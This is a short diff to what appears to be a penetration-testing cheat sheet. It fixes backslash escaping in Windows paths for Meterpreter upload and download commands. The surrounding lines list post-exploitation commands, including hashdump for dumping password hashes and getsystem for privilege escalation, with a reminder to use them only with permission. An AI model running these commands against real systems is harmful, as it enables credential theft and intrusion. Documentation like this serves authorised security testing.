@@ -57,8 +57,8 @@ meterpreter> sysinfo
 meterpreter> getuid
 meterpreter> hashdump        # Dump password hashes
 meterpreter> getsystem       # Privilege escalation attempt
-meterpreter> upload file.exe C:\\Users\\Public\\
-meterpreter> download C:\\Users\\admin\\Desktop\\file.txt
+meterpreter> upload file.exe C:\Users\Public\
+meterpreter> download C:\Users\admin\Desktop\file.txt
 
 # ALWAYS: Only use on systems you own or have explicit written permission
 ```
